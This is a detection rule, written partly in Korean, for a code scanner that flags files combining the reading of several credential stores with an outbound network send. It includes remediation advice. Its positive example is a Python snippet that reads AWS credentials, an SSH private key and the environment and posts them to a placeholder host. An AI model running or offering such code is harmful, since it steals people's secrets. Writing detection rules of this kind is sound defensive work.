---
id: GOV-AGENT-CRED-EXFIL-001
title_ko: 코드가 여러 자격증명 자리를 읽어 외부로 전송합니다 (자격증명 탈취)
title_en: Code reads multiple credential stores and sends the result outbound (credential stealer)
status: approved
source_layer: baseline
sources:
  - publisher: 한국인터넷진흥원
    document: 소프트웨어 개발보안 가이드
    item: 중요정보 외부 전송 통제
  - publisher: OWASP
    document: OWASP Top 10 for Agentic Applications
    version: "2026"
cwe: [CWE-522, CWE-200]
severity: critical
decision_default: block
domains: [agent-supply-chain]
languages: [python, javascript, typescript]
scenarios: [agent, llm-integration, data-pipeline, package-install]
related_baseline: [GOV-SECRET-APIKEY-001, GOV-AGENT-C2-CHANNEL-001]
verified_at: 2026-10-24
review_due: 2027-04-24
detection:
  # agent-surface 엔진. 수집 신호 3종 이상 + 전송 신호가 **같은 파일**에 있을 때만 결합으로 올린다.
  patterns: []
  confidence: likely
  category: agent-supply-chain
  why_it_matters: >-
    자격증명이 있는 자리(SSH·클라우드·패키지 토큰·브라우저 저장소·환경변수 전체·클라우드 메타데이터 등)
    **여러 곳을 읽어** 네트워크로 **내보내면** 전형적인 자격증명 탈취입니다(2025~2026 Shai-Hulud·litellm).
    서랍을 뒤지는 것만으로는 올리지 않습니다 — 백업·설정 동기화 도구도 그렇게 하기 때문입니다. **수집(3종
    이상) + 전송**이 한 파일에 함께 있을 때만 올리고, 결과를 암호화·압축·위장(정상 경로로 가장)하면 확정입니다.
  public_sector_impact:
    - 개발 PC·서버의 클라우드·SSH·토큰 일괄 유출
    - 코드는 깨끗해 보이는데 토큰이 빠져나가는 사고의 실제 경로
  safe_fix: |
    1. 이 코드가 **왜 여러 자격증명 자리를 읽어 밖으로 보내는지** 확인하세요. 정당한 용례(동의된 백업)가
       아니면 **파일의 출처를 의심**하고, 그 PC·서버에서 닿을 수 있던 자격증명을 전부 재발급하세요.
    2. 수집 대상과 전송 목적지를 증거에서 확인하세요(이 보고서는 분류명만 남기고 값은 싣지 않습니다).
    3. 같은 출처(패키지·PR·AI 생성)의 다른 파일과 Git 이력을 함께 점검하세요.
  references:
    - CWE-522 Insufficiently Protected Credentials
    - CWE-200 Exposure of Sensitive Information
  can_auto_fix: false
examples:
  positive:
    - "import os, requests\nd = open(os.path.expanduser('~/.aws/credentials')).read() + open(os.path.expanduser('~/.ssh/id_rsa')).read() + str(dict(os.environ))\nrequests.post('https://x.example/collect', data=d)"
  negative:
    - "import requests\nrequests.post('https://api.example.com/items', json={'name': name})"
---

## 무엇이 위험한가

하나의 신호는 흔하다 — 거의 모든 앱이 네트워크를 쓰고, 백업 도구는 dotfile 을 읽는다. 위험한 것은 **"여러
자격증명 자리를 뒤져서 → 밖으로 보낸다"** 는 조합이다. 이 도구는 그 결합만 올린다.

## 오해하지 마세요

자격증명 자리를 읽기만 하고 전송이 없으면(백업·마이그레이션 도구) 정보성 경고까지만이다. 전송만 있고 수집이
없으면(평범한 API 호출) 올리지 않는다.
